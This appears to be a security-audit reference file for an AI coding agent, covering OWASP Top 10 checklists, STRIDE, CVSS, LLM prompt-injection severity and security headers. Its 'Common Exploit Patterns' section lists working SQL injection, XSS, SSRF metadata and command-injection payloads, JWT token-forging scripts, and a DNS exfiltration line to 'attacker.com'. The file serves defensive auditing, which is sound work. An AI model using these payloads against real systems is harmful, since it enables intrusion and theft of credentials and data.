---
name: offensive-security
description: >
  Reference skill for security-focused phases (/security, /pentest, /redteam-ai,
  /harden). Provides OWASP Top 10 checklist, STRIDE threat model, common attack
  patterns, and exploit classification standards. Load this skill when performing
  any security audit or generating security-related code reviews.
model: opus
metadata:
  version: 1.0.0
  category: security
---

# Offensive Security Reference

## OWASP Top 10 (2021) - Quick Checklist

### A01 - Broken Access Control
- [ ] Horizontal privilege escalation (IDOR) - can user access other users' data?
- [ ] Vertical privilege escalation - can user perform admin actions?
- [ ] Missing function-level access control on API endpoints
- [ ] JWT / session token manipulation
- [ ] CORS misconfiguration allowing unauthorized origins
- [ ] Force-browsing to authenticated pages

### A02 - Cryptographic Failures
- [ ] Sensitive data transmitted without TLS
- [ ] Weak cipher suites (RC4, 3DES, MD5, SHA-1 for signing)
- [ ] Hardcoded secrets / API keys in source code
- [ ] Passwords stored without hashing or with weak hash (MD5, SHA-1)
- [ ] Insufficient key length (RSA < 2048, symmetric < 128-bit)
- [ ] Missing HSTS, certificate pinning for mobile

### A03 - Injection
- [ ] SQL injection (classic, blind, time-based, out-of-band)
- [ ] NoSQL injection (MongoDB `$where`, `$regex`)
- [ ] OS command injection (`exec`, `shell_exec`, `system`, `subprocess`)
- [ ] LDAP injection
- [ ] Template injection (SSTI) - Jinja2, Twig, Handlebars, etc.
- [ ] XPath injection
- [ ] Log injection / log forging

### A04 - Insecure Design
- [ ] Missing rate limiting on auth endpoints
- [ ] Lack of multi-factor authentication on sensitive operations
- [ ] No account lockout policy
- [ ] Business logic flaws (negative quantities, price manipulation)
- [ ] Insecure password recovery flows

### A05 - Security Misconfiguration
- [ ] Default credentials on admin panels
- [ ] Directory listing enabled
- [ ] Debug mode / stack traces exposed in production
- [ ] Unnecessary ports/services exposed
- [ ] Missing security headers (CSP, X-Frame-Options, X-Content-Type-Options)
- [ ] XML External Entity (XXE) processing enabled

### A06 - Vulnerable and Outdated Components
- [ ] CVEs in direct dependencies (`npm audit`, `pip-audit`, `composer audit`)
- [ ] CVEs in transitive dependencies
- [ ] End-of-life language runtimes or frameworks
- [ ] Container base images with known vulnerabilities

### A07 - Identification and Authentication Failures
- [ ] Weak password policy
- [ ] Credential stuffing / brute force (no rate limiting)
- [ ] JWT algorithm confusion (RS256 → HS256, alg:none)
- [ ] Insecure session management (predictable IDs, no expiry)
- [ ] Session fixation
- [ ] OAuth misconfigurations (open redirect, state param missing)

### A08 - Software and Data Integrity Failures
- [ ] Unsigned package / dependency downloads
- [ ] CI/CD pipeline with insufficient integrity checks
- [ ] Insecure deserialization (Java, PHP, Python pickle)
- [ ] Auto-update without signature verification

### A09 - Security Logging and Monitoring Failures
- [ ] Authentication events not logged
- [ ] Insufficient log detail (no IP, user, timestamp)
- [ ] Logs contain sensitive data (passwords, tokens)
- [ ] No alerting on brute force / anomalous patterns
- [ ] Log injection possible (user input in log messages)

### A10 - Server-Side Request Forgery (SSRF)
- [ ] User-supplied URLs fetched server-side
- [ ] Cloud metadata endpoint reachable (`169.254.169.254`)
- [ ] Internal service URLs accessible via SSRF
- [ ] DNS rebinding attacks possible
- [ ] Redirect following to internal IPs

---

## STRIDE Threat Model

Apply to each architectural component:

| Threat | Question to Ask | Mitigation Category |
|---|---|---|
| **Spoofing** | Can an attacker impersonate a user or service? | Authentication |
| **Tampering** | Can an attacker modify data in transit or at rest? | Integrity / Signing |
| **Repudiation** | Can actions be denied after the fact? | Non-repudiation / Audit logs |
| **Information Disclosure** | Can sensitive data leak? | Encryption / Access control |
| **Denial of Service** | Can the service be made unavailable? | Availability / Rate limiting |
| **Elevation of Privilege** | Can a low-privilege actor gain higher access? | Authorization |

---

## Common Exploit Patterns

### SQL Injection
```sql
-- Classic
' OR '1'='1
' OR 1=1 --
' UNION SELECT null, username, password FROM users --

-- Time-based blind
' AND SLEEP(5) --
' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))A) --

-- Boolean blind
' AND 1=1 --   (true)
' AND 1=2 --   (false)
```

### JWT Attacks
```bash
# Algorithm confusion: RS256 → HS256 using public key as HMAC secret
python3 -c "
import jwt, base64
pub_key = open('public.pem').read()
payload = {'user': 'admin', 'role': 'admin'}
token = jwt.encode(payload, pub_key, algorithm='HS256')
print(token)
"

# alg:none attack
python3 -c "
import base64, json
header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')
payload = base64.b64encode(json.dumps({'user':'admin'}).encode()).rstrip(b'=')
print(f'{header.decode()}.{payload.decode()}.')
"
```

### XSS Payloads
```javascript
// Basic
<script>alert(1)</script>

// Attribute injection
" onmouseover="alert(1)

// DOM-based
javascript:alert(document.cookie)

// Filter bypass
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

### SSRF
```
# Cloud metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Internal services
http://localhost:6379/  (Redis)
http://localhost:9200/  (Elasticsearch)
http://localhost:2375/  (Docker API)

# Bypass filters
http://127.0.0.1
http://[::1]
http://0.0.0.0
http://2130706433  (decimal form of 127.0.0.1)
```

### Command Injection
```bash
# Linux
; id
| id
`id`
$(id)
& id
&& id

# Blind
; sleep 10
| sleep 10

# Data exfil via DNS
; nslookup $(whoami).attacker.com
```

---

## CVSS v3.1 Quick Scoring

| Metric | Values |
|---|---|
| **Attack Vector** | Network (N), Adjacent (A), Local (L), Physical (P) |
| **Attack Complexity** | Low (L), High (H) |
| **Privileges Required** | None (N), Low (L), High (H) |
| **User Interaction** | None (N), Required (R) |
| **Scope** | Unchanged (U), Changed (C) |
| **Confidentiality** | None (N), Low (L), High (H) |
| **Integrity** | None (N), Low (L), High (H) |
| **Availability** | None (N), Low (L), High (H) |

Critical (9.0 - 10.0) examples:
- Network / Low complexity / No privileges / No interaction / High CIA = 9.8

Use https://www.first.org/cvss/calculator/3.1 for precise scoring.

---

## AI/LLM Specific Threats

### Prompt Injection Severity Matrix

| Scenario | Impact | Severity |
|---|---|---|
| Model has no tool access, output is displayed | XSS / content manipulation | Medium |
| Model has tool access (read files, APIs) | Data exfiltration | High |
| Model has tool access (write files, exec code) | Full system compromise | Critical |
| Indirect injection via uploaded files | Depends on tools | High - Critical |

### Secure LLM Integration Checklist
- [ ] User input is never placed in the system prompt
- [ ] Model output is HTML-escaped before rendering
- [ ] Model output is never passed to `eval()`, `exec()`, or SQL
- [ ] Tool/function calls are restricted to an explicit allow-list
- [ ] Rate limiting applied to inference endpoints
- [ ] Sensitive data excluded from model context / RAG corpus
- [ ] Output schemas validated before use (structured output)

---

## Security Headers Checklist

```
Content-Security-Policy: default-src 'self'; script-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

Test with: https://securityheaders.com
